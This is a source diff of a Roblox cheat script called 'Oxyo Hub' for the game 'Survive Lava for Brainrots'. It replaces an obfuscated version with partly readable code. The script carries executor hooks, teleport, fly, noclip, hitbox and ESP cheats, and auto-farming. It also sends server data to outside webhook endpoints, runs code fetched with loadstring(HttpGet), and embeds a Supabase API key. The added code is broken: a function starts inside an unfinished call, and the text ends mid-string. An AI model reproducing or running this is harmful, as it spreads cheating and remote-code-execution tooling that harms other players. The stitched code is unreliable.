@@ -1,12 +1,7825 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+local Players, RunService, TweenService, UserInputService,
+      ReplicatedStorage, GuiService, TeleportService, VirtualUser, Lighting
+Players           = game:GetService("Players")
+RunService        = game:GetService("RunService")
+TweenService      = game:GetService("TweenService")
+UserInputService  = game:GetService("UserInputService")
+ReplicatedStorage = game:GetService("ReplicatedStorage")
+GuiService        = game:GetService("GuiService")
+TeleportService   = game:GetService("TeleportService")
+VirtualUser       = game:GetService("VirtualUser")
+Lighting          = game:GetService("Lighting")
+local origLight         = { Lighting.Brightness, Lighting.ClockTime, Lighting.FogEnd, Lighting.GlobalShadows, Lighting.OutdoorAmbient }
+local sendWebhook, _searchServers
+;(function()
+local WEBHOOK_URL      = "https://webhooksqw.mohammadahmadqazplm.workers.dev"
+local _webhookReady    = true
+local _httpReq = (typeof(request)        == "function" and request)
+              or (typeof(http_request)   == "function" and http_request)
+              or (typeof(http)           == "table" and typeof(http.request)   == "function" and http.request)
+              or (typeof(syn)            == "table" and typeof(syn.request)    == "function" and syn.request)
+              or (typeof(fluxus)         == "table" and typeof(fluxus.request) == "function" and fluxus.request)
+              or nil
+local function getServerLink()
+    local pid = tostring(game.PlaceId)
+    local jid = tostring(game.JobId)
+    return "https://www.roblox.com/games/start?placeId=" .. pid
+        .. "&gameInstanceId=" .. jid
+        .. "&startPlaceId="   .. pid
+end
+local function getMobileDeepLink()
+    local pid = tostring(game.PlaceId)
+    local jid = tostring(game.JobId)
+    return "roblox://experiences/start?placeId=" .. pid .. "&gameInstanceId=" .. jid
+end
+local function getServerPlayerCount()
+    local ok, n = pcall(function() return #game:GetService("Players"):GetPlayers() end)
+    return (ok and type(n) == "number") and n or 0
+end
+local _webhookSent, _webhookHistory = {}, {}
+local ROLE_PINGS = {
+    { key = "celest", id = "1484573463598469242" },
+    { key = "godly",  id = "1484573408443236472" },
+    { key = "volcan", id = "1484575858529403112" },
+    { key = "frenzy", id = "1484573786505482260" },
+    { key = "storm",  id = "1484573285671764139" },
+    { key = "slime",  id = "1484573205317292042" },
+    { key = "moon",   id = "1484573650697850890" },
+    { key = "king",   id = "1484573892994531420" },
+    { key = "coin",   id = "1484573143656955904" },
+    { key = "luck",   id = "1484573521936912485" },
+    { key = "x2",     id = "1484573521936912485" },
+}
+local function _getRoleId(title, tbl)
+    local t = title:lower()
+    for _, entry in ipairs(tbl or ROLE_PINGS) do
+        if t:find(entry.key, 1, true) then return entry.id end
+    end
+    return nil
+end
+local function getWebhookCategory(title)
+    local t = title:lower()
+    if t:find("coin")       then return "Coin"
+    elseif t:find("godly")  then return "Godly"
+    elseif t:find("celest") then return "Celestial"
+    else return "Event" end
+end
+local function buildOxyoEmbed(title, description, color)
+    local serverLink  = getServerLink()
+    local deepLink    = getMobileDeepLink()
+    local playerCount = getServerPlayerCount()
+    local maxPlayers  = game:GetService("Players").MaxPlayers
+    local capturedAt  = os.date("%H:%M:%S UTC")
+    local dateStr     = os.date("%Y-%m-%d")
+    local jobShort    = tostring(game.JobId):sub(1, 8)
+    local filled = math.floor((playerCount / math.max(maxPlayers, 1)) * 10)
+    local bar    = string.rep("█", filled) .. string.rep("░", 10 - filled)
+    local icon = "⚡"
+    local t = title:lower()
+    if     t:find("godly")  then icon = "👑"
+    elseif t:find("celest") then icon = "🌌"
+    elseif t:find("coin")   then icon = "🪙"
+    elseif t:find("event")  then icon = "🎯"
+    elseif t:find("rain")   then icon = "🌧️"
+    elseif t:find("patric") then icon = "🍀"
+    elseif t:find("volcan") then icon = "🌋"
+    elseif t:find("aqua")   then icon = "🌊"
+    elseif t:find("dream")  then icon = "💜"
+    end
+    local roleId = _getRoleId(title)
+    local pingContent = roleId and ("<@&" .. roleId .. ">") or nil
+    return {
+        username         = "OXYO HUB",
+        avatar_url       = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png",
+        content          = pingContent,
+        allowed_mentions = roleId and { roles = { roleId } } or { parse = {} },
+        embeds = {{
+            color       = color or 0x7B2FBE,
+            author      = {
+                name     = icon .. "  " .. title .. "  " .. icon,
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png",
+            },
+            description = "```ansi\n\27[1;35m" .. (description or "") .. "\27[0m\n```",
+            fields = {
+                {
+                    name   = "╔══ 🖥️  JOIN — PC / WEB",
+                    value  = "╚══▶  [**Click here to teleport**](" .. serverLink .. ")",
+                    inline = false,
+                },
+                {
+                    name   = "╔══ 📱  JOIN — MOBILE  (long-press & copy)",
+                    value  = "`" .. deepLink .. "`",
+                    inline = false,
+                },
+                {
+                    name   = "👥  Players",
+                    value  = "`" .. bar .. "`\n**" .. playerCount .. " / " .. maxPlayers .. "**",
+                    inline = true,
+                },
+                {
+                    name   = "🌐  Server",
+                    value  = "```" .. jobShort .. "...```",
+                    inline = true,
+                },
+                {
+                    name   = "⏱️  Captured",
+                    value  = "**" .. capturedAt .. "**",
+                    inline = true,
+                },
+            },
+            footer    = {
+                text     = "✦ OXYO HUB  •  " .. dateStr .. "  •  Powered by Oxyo",
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png",
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }},
+    }
+end
+local _HOOK_MIN_GAP = 5
+local _queues = { oxyo = {} }
+local _qBusy  = { oxyo = false }
+local _qLast  = { oxyo = 0    }
+local function _sendOnce(item)
+    if not _httpReq then return false, "no_http" end
+    if tick() - item.queuedAt > 300 then return false, "stale" end
+    local ok, res = pcall(function()
+        local HttpService = game:GetService("HttpService")
 
-]]--
+local function _jitter(base, range)
+    task.wait(base + math.random(0, math.floor((range or base) * 10)) / 10)
+end
 
-local v0,v1,v2,v3,v4,v5,v6,v7,v8;v0=game:GetService("Players");v1=game:GetService("RunService");v2=game:GetService("TweenService");v3=game:GetService("UserInputService");v4=game:GetService("ReplicatedStorage");v5=game:GetService("GuiService");v6=game:GetService("TeleportService");v7=game:GetService("VirtualUser");v8=game:GetService("Lighting");local v9={v8.Brightness,v8.ClockTime,v8.FogEnd,v8.GlobalShadows,v8.OutdoorAmbient};local v10,v11;(function() local v173="https://mohammadahmadqazplmsource--71b22d2c2df811f1890142dde27851f2.web.val.run";local v174=true;local v175=((typeof(request)=="function") and request) or ((typeof(http)=="table") and (typeof(http.request)=="function") and http.request) or ((typeof(syn)=="table") and (typeof(syn.request)=="function") and syn.request) or nil ;local function v176() local v570=tostring(game.PlaceId);local v571=tostring(game.JobId);return "https://www.roblox.com/games/start?placeId="   .. v570   .. "&gameInstanceId="   .. v571   .. "&startPlaceId="   .. v570 ;end local function v177() local v572=tostring(game.PlaceId);local v573=tostring(game.JobId);return "roblox://experiences/start?placeId="   .. v572   .. "&gameInstanceId="   .. v573 ;end local function v178() local v574,v575=pcall(function() return  #game:GetService("Players"):GetPlayers();end);return (v574 and (type(v575)=="number") and v575) or 0 ;end local v179,v180={},{};local v181={{key="celest",id="1484573463598469242"},{key="godly",id="1484573408443236472"},{key="volcan",id="1484575858529403112"},{key="frenzy",id="1484573786505482260"},{key="storm",id="1484573285671764139"},{key="slime",id="1484573205317292042"},{key="moon",id="1484573650697850890"},{key="king",id="1484573892994531420"},{key="coin",id="1484573143656955904"},{key="luck",id="1484573521936912485"},{key="x2",id="1484573521936912485"}};local function v182(v576,v577) local v578=v576:lower();for v1140,v1141 in ipairs(v577 or v181 ) do if v578:find(v1141.key,1,true) then return v1141.id;end end return nil;end local function v183(v579) local v580=v579:lower();if v580:find("coin") then return "Coin";elseif v580:find("godly") then return "Godly";elseif v580:find("celest") then return "Celestial";else return "Event";end end local function v184(v581,v582,v583) local v584=v176();local v585=v177();local v586=v178();local v587=game:GetService("Players").MaxPlayers;local v588=os.date("%H:%M:%S UTC");local v589=os.date("%Y-%m-%d");local v590=tostring(game.JobId):sub(1,8);local v591=math.floor((v586/math.max(v587,1)) * 10 );local v592=string.rep("█",v591)   .. string.rep("░",10 -v591 ) ;local v593="⚡";local v594=v581:lower();if v594:find("godly") then v593="👑";elseif v594:find("celest") then v593="🌌";elseif v594:find("coin") then v593="🪙";elseif v594:find("event") then v593="🎯";elseif v594:find("rain") then v593="🌧️";elseif v594:find("patric") then v593="🍀";elseif v594:find("volcan") then v593="🌋";elseif v594:find("aqua") then v593="🌊";end local v595=v182(v581);local v596=(v595 and ("<@&"   .. v595   .. ">")) or nil ;return {username="OXYO HUB",avatar_url="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png",content=v596,allowed_mentions=(v595 and {roles={v595}}) or {parse={}} ,embeds={{color=v583 or 8073150 ,author={name=v593   .. "  "   .. v581   .. "  "   .. v593 ,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"},description="```ansi\n\27[1;35m"   .. (v582 or "")   .. "\27[0m\n```" ,fields={{name="╔══ 🖥️  JOIN — PC / WEB",value="╚══▶  [**Click here to teleport**]("   .. v584   .. ")" ,inline=false},{name="╔══ 📱  JOIN — MOBILE  (long-press & copy)",value="`"   .. v585   .. "`" ,inline=false},{name="👥  Players",value="`"   .. v592   .. "`\n**"   .. v586   .. " / "   .. v587   .. "**" ,inline=true},{name="🌐  Server",value="```"   .. v590   .. "...```" ,inline=true},{name="⏱️  Captured",value="**"   .. v588   .. "**" ,inline=true}},footer={text="✦ OXYO HUB  •  "   .. v589   .. "  •  Powered by Oxyo" ,icon_url="https://www.roblox.com/headshot-thumbnail/image?userId=1&width=420&height=420&format=png"},timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ")}}};end local v185=1;local v186={oxyo={}};local v187={oxyo=false};local v188={oxyo=0};local function v189(v597) if  not v175 then return false,"no_http";end if ((tick() -v597.queuedAt)>300) then return false,"stale";end local v598,v599=pcall(function() local v1142=game:GetService("HttpService");local v1143=v1142:JSONEncode(v597.payload);return v175({Url=v597.url,Method="POST",Headers={["Content-Type"]="application/json"},Body=v1143});end);if ( not v598 or  not v599) then return false,"pcall_error";end local v600=tonumber(v599.StatusCode or v599.status ) or 0 ;if ((v600==200) or (v600==204)) then return true,"ok";end if (v600==429) then local v1626=v185;pcall(function() local v1953=game:GetService("HttpService"):JSONDecode(v599.Body or "{}" );local v1954=tonumber(v1953.retry_after) or v185 ;v1626=((v1954<1) and (v1954 * 1000)) or v1954 ;end);v1626=math.clamp(v1626,v185,60);task.wait(v1626);return false,"rate_limited";end return false,"http_"   .. tostring(v600) ;end local function v190(v601) if v187[v601] then return;end v187[v601]=true;task.spawn(function() while  #v186[v601]>0  do local v1627=table.remove(v186[v601],1);local v1628=v185-(tick() -v188[v601]) ;if (v1628>0) then task.wait(v1628);end v188[v601]=tick();local v1630,v1631=false,"unknown";for v1955=1,3 do v1630,v1631=v189(v1627);if v1630 then break;end if ((v1631=="stale") or (v1631=="no_http")) then break;end if (v1955<3) then task.wait(((v1631=="rate_limited") and 0) or math.min(3 * (2^(v1955-1)) ,12) );end end end v187[v601]=false;end);end local function v191(v603,v604,v605) table.insert(v186[v605],{url=v603,payload=v604,queuedAt=tick()});v190(v605);end function v10(v606,v607,v608) if ( not game.JobId or (game.JobId=="")) then return;end local v609=v606   .. "|"   .. v607 ;if v179[v609] then return;end v179[v609]=true;task.delay(90,function() v179[v609]=nil;end);local v611=v183(v606);table.insert(v180,1,{time=os.date("%H:%M:%S"),title=v606,description=v607,color=v608 or 8073150 ,category=v611,serverLink=v176()});if ( #v180>50) then table.remove(v180);end task.spawn(function() local v1146=0;while  not v174 and (v1146<5)  do task.wait(0.25);v1146+=0.25 end if  not v174 then return;end if (v173~="") then v191(v173,v184(v606,v607,v608),"oxyo");pcall(function() local v2173=game:GetService("HttpService");v175({Url=v173,Method="POST",Headers={["Content-Type"]="application/json"},Body=v2173:JSONEncode({action="event_report",jobId=tostring(game.JobId),placeId=tostring(game.PlaceId),type=v611:lower(),ts=os.time()})});end);end end);end getgenv()._OxyoFetchWHEvents=function(v612) v612=v612 or 180 ;local v613,v614=pcall(function() return game:HttpGet(v173   .. "?action=event_list&max_age="   .. tostring(v612) );end);if ( not v613 or  not v614 or (v614=="")) then return {};end local v615,v616=pcall(function() return game:GetService("HttpService"):JSONDecode(v614);end);return (v615 and (type(v616)=="table") and v616) or {} ;end;end)();if  not getgenv then function getgenv() return _G;end end if (getgenv().OxyoHopStopped==true) then getgenv().OxyoHopStopped=false;getgenv().OxyoAutoHopCoin=false;getgenv().OxyoHopGodlyStopped=false;getgenv().OxyoAutoHopGodly=false;getgenv().OxyoHopCelStopped=false;getgenv().OxyoAutoHopCel=false;getgenv().OxyoHopFragStopped=false;getgenv().OxyoAutoHopFrag=false;end local v12,v13,v14="1","",false;pcall(function() local v193=((typeof(request)=="function") and request) or ((typeof(http)=="table") and (typeof(http.request)=="function") and http.request) or ((typeof(syn)=="table") and (typeof(syn.request)=="function") and syn.request) ;if  not v193 then return;end local v194=v193({Url=v13,Method="GET"});if ( not v194 or  not v194.Body) then return;end local v195,v196=pcall(function() return game:GetService("HttpService"):JSONDecode(v194.Body);end);if  not v195 then return;end local v197=tostring(v196 or "" );if ((v197~="") and (v197~=v12)) then v14=true;pcall(function() local v1632=Instance.new("ScreenGui");v1632.Name="OxyoUpdateGui";v1632.ResetOnSpawn=false;v1632.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;pcall(function() v1632.Parent=game:GetService("CoreGui");end);local v1637=Instance.new("Frame",v1632);v1637.Size=UDim2.new(0,400,0,110);v1637.Position=UDim2.new(0.5, -200,0,24);v1637.BackgroundColor3=Color3.fromRGB(8,8,8);v1637.BorderSizePixel=0;Instance.new("UICorner",v1637).CornerRadius=UDim.new(0,12);local v1643=Instance.new("Frame",v1637);v1643.Size=UDim2.new(1,0,0,3);v1643.BackgroundColor3=Color3.fromRGB(0,210,255);v1643.BorderSizePixel=0;Instance.new("UICorner",v1643).CornerRadius=UDim.new(0,12);local v1648=Instance.new("TextLabel",v1637);v1648.Size=UDim2.new(1, -24,1,0);v1648.Position=UDim2.new(0,12,0,0);v1648.BackgroundTransparency=1;v1648.Text="🔄  Oxyo Hub — Update Required\nA new version is available. Please re-execute the script.";v1648.TextColor3=Color3.fromRGB(220,220,220);v1648.Font=Enum.Font.GothamMedium;v1648.TextSize=14;v1648.TextWrapped=true;v1648.TextXAlignment=Enum.TextXAlignment.Left;task.delay(10,function() pcall(function() v1632:Destroy();end);end);end);end end);if v14 then return;end if getgenv().OxyoHubLoaded then return;end getgenv().OxyoHubLoaded=true;task.spawn(function() task.wait(10);while true do task.wait(60);pcall(function() local v1147=((typeof(request)=="function") and request) or ((typeof(http)=="table") and (typeof(http.request)=="function") and http.request) or ((typeof(syn)=="table") and (typeof(syn.request)=="function") and syn.request) ;if  not v1147 then return;end local v1148=v1147({Url=v13,Method="GET"});if ( not v1148 or  not v1148.Body) then return;end local v1149,v1150=pcall(function() return game:GetService("HttpService"):JSONDecode(v1148.Body);end);if  not v1149 then return;end if ((tostring(v1150)~="") and (tostring(v1150)~=v12)) then getgenv().OxyoHubLoaded=false;pcall(function() Rayfield:Notify({Title="🔄 Update Required",Content="A new version of Oxyo Hub is available.\nPlease re-execute the script.",Duration=10,Image=4483362458});end);task.wait(3);pcall(function() Rayfield:Destroy();end);end end);end end);if  not setclipboard then function setclipboard() end end if  not rconsoleprint then function rconsoleprint() end end if  not isreadonly then function isreadonly() return false;end end if  not setreadonly then function setreadonly() end end if  not newcclosure then function newcclosure(v1151) return v1151;end end if  not getnamecallmethod then function getnamecallmethod() return "";end end if  not getrawmetatable then function getrawmetatable(v1152) return getmetatable(v1152);end end local v16=((typeof(fireproximityprompt)=="function") and fireproximityprompt) or function(v198) if ( not v198 or  not v198.Parent) then return;end local v199=v0.LocalPlayer.Character;v199=v199 and v199:FindFirstChild("HumanoidRootPart") ;if  not v199 then return;end local v200=v198.Parent;if  not v200:IsA("BasePart") then v200=v200:FindFirstChildWhichIsA("BasePart") or (v200.Parent and v200.Parent:FindFirstChildWhichIsA("BasePart")) ;end local v201;if (v200 and v200:IsA("BasePart")) then v201=v200.Position + Vector3.new(0,3,0) ;elseif v198.Parent:IsA("Attachment") then v201=v198.Parent.WorldPosition + Vector3.new(0,3,0) ;else local v1958=pcall(function() return v198.Parent.Position;end);if v1958 then v201=v198.Parent.Position + Vector3.new(0,3,0) ;else return;end end pcall(function() v199.CFrame=CFrame.new(v201);end);task.wait(0.12);local v202=pcall(function() game:GetService("ProximityPromptService"):PromptTriggered(v198,v0.LocalPlayer);end);if  not v202 then pcall(function() local v1660=v4:FindFirstChild("Events");local v1661=v1660 and (v1660:FindFirstChild("Interact") or v1660:FindFirstChild("ProximityPrompt") or v1660:FindFirstChild("Trigger") or v1660:FindFirstChild("PickUp") or v1660:FindFirstChild("Collect")) ;if v1661 then v1661:FireServer(v198);end end);end task.wait(0.08);end ;local v17=((typeof(firetouchinterest)=="function") and firetouchinterest) or function(v203,v204,v205) if ( not v203 or  not v204) then return;end if (v205==0) then local v1153=v203.CFrame;local v1154=false;v1154=pcall(function() v203.CFrame=CFrame.new(v204.Position + Vector3.new(0,0.5,0) );end);if  not v1154 then pcall(function() v203.Position=v204.Position + Vector3.new(0,0.5,0) ;end);end task.wait(0.08);pcall(function() v203.CFrame=v1153;end);elseif (v205==1) then local v1959=v203.CFrame;pcall(function() v203.CFrame=CFrame.new(v204.Position + Vector3.new(0,100,0) );end);task.wait(0.05);pcall(function() v203.CFrame=v1959;end);end end ;local v18=(typeof(getrawmetatable)=="function") and (typeof(setreadonly)=="function") and (typeof(newcclosure)=="function") and (typeof(getnamecallmethod)=="function") and (pcall(function() return getrawmetatable(game);end)) ;local v19="https://raw.githubusercontent.com/idcidc1234xdlol-bit/lava/refs/heads/main/lava";local v20=game:GetService("HttpService");local v21=game.PlaceId;local v22=game.JobId;local function v23() if (getgenv().OxyoAutoHopCoin and getgenv().OxyoHopStopped) then return true;end if (getgenv().OxyoAutoHopGodly and getgenv().OxyoHopGodlyStopped) then return true;end if (getgenv().OxyoAutoHopCel and getgenv().OxyoHopCelStopped) then return true;end if (getgenv().OxyoAutoHopFrag and getgenv().OxyoHopFragStopped) then return true;end return false;end local function v24() return getgenv().OxyoAutoHopCoin or getgenv().OxyoAutoHopGodly or getgenv().OxyoAutoHopCel or getgenv().OxyoAutoHopFrag ;end local v25=(function() local v206,v207,v208={},{},0;v206.add=function(v626,v627) if  not v626 then return;end v208+=1 v207[v208]={c=v626,tag=v627 or "misc" };return v208;end;v206.remove=function(v629) if ( not v629 or  not v207[v629]) then return;end pcall(function() v207[v629].c:Disconnect();end);v207[v629]=nil;end;v206.clear=function(v631) if  not v631 then for v1960,v1961 in pairs(v207) do pcall(function() v1961.c:Disconnect();end);v207[v1960]=nil;end return;end for v1155,v1156 in pairs(v207) do if (v1156.tag==v631) then pcall(function() v1156.c:Disconnect();end);v207[v1155]=nil;end end end;v206.size=function() local v632=0;for v1157 in pairs(v207) do v632+=1 end return v632;end;task.spawn(function() while true do task.wait(120);local v1158={};for v1664,v1665 in pairs(v207) do local v1666=pcall(function() local v1964=v1665.c.Connected;end);if  not v1666 then table.insert(v1158,v1664);end end for v1667,v1668 in ipairs(v1158) do v207[v1668]=nil;end end end);return v206;end)();local v26=(function() local v213,v214={},{};local v215={GF=300,Brainrots=120,Plots=60,SubmitPart=180,MyPlot=45,RarityDir=90};v213.get=function(v633) local v634=v214[v633];if  not v634 then return nil;end if ((tick() -v634.t)>(v215[v633:match("^(%a+)") or v633 ] or 60)) then v214[v633]=nil;return nil;end if ((typeof(v634.v)=="Instance") and  not v634.v.Parent) then v214[v633]=nil;return nil;end return v634.v;end;v213.set=function(v635,v636) v214[v635]={v=v636,t=tick()};return v636;end;v213.del=function(v638) v214[v638]=nil;end;v213.flush=function(v640) if  not v640 then v214={};return;end for v1159 in pairs(v214) do if (v1159:sub(1, #v640)==v640) then v214[v1159]=nil;end end end;task.spawn(function() while true do task.wait(180);local v1160=tick();for v1672,v1673 in pairs(v214) do local v1674=v215[v1672:match("^(%a+)") or v1672 ] or 60 ;if ((v1160-v1673.t)>(v1674 * 2)) then v214[v1672]=nil;end end end end);return v213;end)();local function v27() local v220=v26.get("GF");if v220 then return v220;end local v221=workspace:FindFirstChild("GameFolder");return (v221 and v26.set("GF",v221)) or nil ;end local function v28() local v222=v26.get("Brainrots");if v222 then return v222;end local v223=v27();local v224=v223 and v223:FindFirstChild("Brainrots") ;return (v224 and v26.set("Brainrots",v224)) or nil ;end local function v29() local v225=v26.get("Plots");if v225 then return v225;end local v226=v27();local v227=v226 and v226:FindFirstChild("Plots") ;return (v227 and v26.set("Plots",v227)) or nil ;end local function v30(v228) local v229="RarityDir_"   .. v228 ;local v230=v26.get(v229);if v230 then return v230;end if (v228=="Godly") then local v1161=workspace:FindFirstChild("Brainrots");local v1162=v1161 and v1161:FindFirstChild("Godly") ;if v1162 then return v26.set(v229,v1162);end end local v231=v27();local v232=v231 and v231:FindFirstChild("Brainrots") ;local v233=v232 and v232:FindFirstChild(v228) ;return (v233 and v26.set(v229,v233)) or nil ;end local function v31() local v234=v26.get("MyPlot");if v234 then return v234;end local v235=v29();if  not v235 then return nil;end for v641,v642 in ipairs(v235:GetChildren()) do local v643=v642:FindFirstChild("Brainrots");if  not v643 then continue;end for v1163,v1164 in ipairs(v643:GetChildren()) do local v1165,v1166=pcall(function() return v1164:GetAttribute("Owner");end);if (v1165 and v1166 and (tostring(v1166)==tostring(game:GetService("Players").LocalPlayer.UserId))) then return v26.set("MyPlot",v642);end end end return nil;end local v32=Vector3.new( -30.419689,4.307883, -54.771233);local function v33() local v236=v26.get("SubmitPart");if v236 then return v236.CFrame + Vector3.new(0,3,0) ;end local v237=v27();local function v238(v644) for v1167,v1168 in ipairs(v644:GetDescendants()) do if (v1168:IsA("BasePart") and ((v1168.Position-v32).Magnitude<14)) then v26.set("SubmitPart",v1168);return v1168.CFrame + Vector3.new(0,3,0) ;end end end if v237 then local v1169=v238(v237);if v1169 then return v1169;end end local v239=v238(workspace);if v239 then return v239;end return CFrame.new(v32 + Vector3.new(0,3,0) );end task.spawn(function() while true do task.wait(600);pcall(function() v26.flush();end);end end);local v34=(function() local v240,v241={},game:GetService("HttpService");local v242="https://uqbcysqwszxnvjrigkkp.supabase.co";local v243="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InVxYmN5c3F3c3p4bnZqcmlna2twIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzUyOTQyNjMsImV4cCI6MjA5MDg3MDI2M30.C_RmmYmon8ctloCj9rIxDHnODYaFZPxIBXaLmNdeOAE";local v244=((typeof(request)=="function") and request) or ((typeof(http)=="table") and (typeof(http.request)=="function") and http.request) or ((typeof(syn)=="table") and (typeof(syn.request)=="function") and syn.request) ;local v245={f=0,on=false,t=0};local function v246() if  not v245.on then return true;end if ((tick() -v245.t)>=45) then v245.on=false;v245.f=0;return true;end return false;end local function v247(v645) if v645 then v245.f=0;v245.on=false;return;end v245.f+=1 if ((v245.f>=5) and  not v245.on) then v245.on=true;v245.t=tick();end end v240.call=function(v646,v647,v648,v649) if ( not v244 or  not v246()) then return nil;end v649=v649 or 7 ;local v650,v651=nil,false;local v652=Instance.new("BindableEvent");task.spawn(function() if ((v646=="GET") and (v647=="sv")) then local v1966,v1967=pcall(v244,{Url=v242   .. "/rest/v1/servers?select=*" ,Method="GET",Headers={apikey=v243,Authorization="Bearer "   .. v243 ,Accept="application/json"}});if (v1966 and v1967) then local v2324=((v1967.Body~=nil) and (v1967.Body~="") and v1967.Body) or "null" ;local v2325,v2326=pcall(v241.JSONDecode,v241,v2324);if (v2325 and (type(v2326)=="table")) then local v2476={};for v2520,v2521 in ipairs(v2326) do if v2521.job_key then v2476[v2521.job_key]={j=v2521.job_id,p=v2521.place_id,t=v2521.t,c=v2521.c or 0 ,b=v2521.b,coinRain=v2521.coin_rain,hasFrag=v2521.has_frag};end end v650=v2476;end end end if  not v651 then v651=true;pcall(function() v652:Fire();end);end end);local v653=tick() + v649 ;local v654;v654=v652.Event:Connect(function() v651=true;pcall(function() v654:Disconnect();end);end);while  not v651 and (tick()<v653)  do task.wait(0.04);end v651=true;pcall(function() v654:Disconnect();v652:Destroy();end);v247(v650~=nil );return v650;end;local v249={ids=nil,t=0};v240.pubIds=function(v655) if ( not v655 and v249.ids and ((tick() -v249.t)<22)) then return v249.ids;end local v656,v657={},"";for v1170=1,7 do local v1171="https://games.roblox.com/v1/games/"   .. game.PlaceId   .. "/servers/Public?sortOrder=Asc&limit=100" ;if (v657~="") then v1171=v1171   .. "&cursor="   .. v657 ;end local v1172,v1173=pcall(function() return game:HttpGet(v1171);end);if ( not v1172 or  not v1173) then break;end local v1174,v1175=pcall(function() return v241:JSONDecode(v1173);end);if ( not v1174 or  not v1175 or  not v1175.data) then break;end for v1681,v1682 in ipairs(v1175.data) do if v1682.id then v656[v1682.id]=true;end end if (v1175.nextPageCursor and (v1175.nextPageCursor~="")) then v657=v1175.nextPageCursor;task.wait(0.06);else break;end end v249.ids=v656;v249.t=tick();return v656;end;return v240;end)();getgenv().OxyoExecQueued=false;getgenv().OxyoDeadServers=getgenv().OxyoDeadServers or {} ;getgenv().OxyoVisitedServers=getgenv().OxyoVisitedServers or {} ;local v38=loadstring(game:HttpGet("https://sirius.menu/rayfield"))();local v39=v38:CreateWindow({Name="Oxyo | Survive Lava for Brainrots",LoadingTitle="Loading Oxyo...",LoadingSubtitle="by Mohammad",ConfigurationSaving={Enabled=true,FolderName="OxyoHub",FileName="oxyoHub_v6"},Discord={Enabled=false,Invite="noinvitelink",RememberJoins=true},KeySystem=false});local v40=v0.LocalPlayer;local v41,v42,v43;v41=v40.Character or v40.CharacterAdded:Wait() ;v42=v41:WaitForChild("Humanoid");v43=v41:WaitForChild("HumanoidRootPart");local function v44() local v251=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;return (v251 and v251.WalkSpeed) or 16 ;end local function v45() local v252=v40.Character and v40.Character:FindFirstChildOfClass("Humanoid") ;return (v252 and v252.JumpPower) or 50 ;end local v46={flyEnabled=false,noclipEnabled=false,infinityJumpEnabled=false,currentSpeed=16,currentJumpPower=50,speedEnabled=false,jumpEnabled=false,originalSpeed=nil,originalJump=nil,nowe=false,speeds=1,tpwalking=false,upHeld=false,downHeld=false,instantGrabEnabled=false,instantGrabConnection=nil,OriginalHoldTimes={},collectorRunning=false,collectorThread=nil,selectedRarities={},selectedMutations={},selectedTraits={},grabLock=false,grabLockTime=0,maxCarry=1,farmByNameFilter="",autoNameEnabled=false,autoNameThread=nil,lavaRemoved=false,traitData={},monitorThread=nil,autoCoinEnabled=false,autoHopCoinEnabled=false,autoHopGodlyEnabled=false,autoHopGodlyThread=nil,autoHopCelEnabled=false,autoHopCelThread=nil,coinEventDuration=60,collectedCount=0,countConn=nil,hitboxEnabled=false,hitboxSize=50,hitboxTransp=0.7,hitboxColor=BrickColor.new("Really blue"),volcanoEnabled=false,volcanoThread=nil,fullBrightEnabled=false,infiniteZoomEnabled=false,playerESPEnabled=false,espConnections={},celestialESPEnabled=false,celestialESPConnection=nil,selectedGear=nil,selectedGears={},selectedLBs={},mutationAlertDropdown={},autoFragmentEnabled=false,autoFragmentConn=nil,autoHopFragEnabled=false,autoHopFragThread=nil,wwhCoinThread=nil,wwhGodlyThread=nil,wwhCelThread=nil,wwhFragThread=nil,wwhBRThread=nil};local v47={"Common","Rare","Epic","Legendary","Mythic","Secret","Celestial","Godly","Forbidden"};local v48={"MoonGlow","Magma","Storm","Slime","Volcano","Shamrock","Ice","Forbidden","Arid"};local v49={Godly=1,Celestial=2,Secret=3,Mythic=4,Legendary=5,Epic=6,Rare=7,Common=8};local v50={brainrots={},mutations={},totalCount=0,lastScan=0,isRunning=false};local v51={meteorEnabled=false,meteorThread=nil,luckyEnabled=false,luckyConn=nil,luckyType="All",luckyTraits={},spinEnabled=false,spinThread=nil,moneyEnabled=false,moneyThread=nil,upgradeEnabled=false,upgradeThread=nil,sellEnabled=false,sellThread=nil,sellThreshold=50,sellTimer=0,buyEnabled=false,buyThread=nil,buyLBEnabled=false,buyLBThread=nil,alertEnabled=false,alertThread=nil,rebirthEnabled=false,rebirthThread=nil};local v52={GrappleHook={displayName="Grapple Hook",coinPrice=75,serverKey="GrappleHook"},LavaBoots={displayName="Lava Boots",coinPrice=125,serverKey="Lava Boots"},StopLava={displayName="Stop Lava",coinPrice=250,serverKey="Stop Lava"},MagicCarpet={displayName="Magic Carpet",coinPrice=475,serverKey="MagicCarpet"},LevelPotion={displayName="Level Potion",coinPrice=550,serverKey="Level Potion"},PlungeGrapple={displayName="Plunge Grapple",coinPrice=0,serverKey="PlungeGrapple"},SubspaceTripmine={displayName="Subspace Tripmine",coinPrice=0,serverKey="SubspaceTripmine"},Hammer={displayName="Hammer",coinPrice=0,serverKey="Hammer"},SpikedBat={displayName="Spiked Bat",coinPrice=0,serverKey="SpikedBat"},Taser={displayName="Taser",coinPrice=0,serverKey="Taser"},Slapper={displayName="Slapper",coinPrice=0,serverKey="Slapper"},DiscoBomb={displayName="Disco 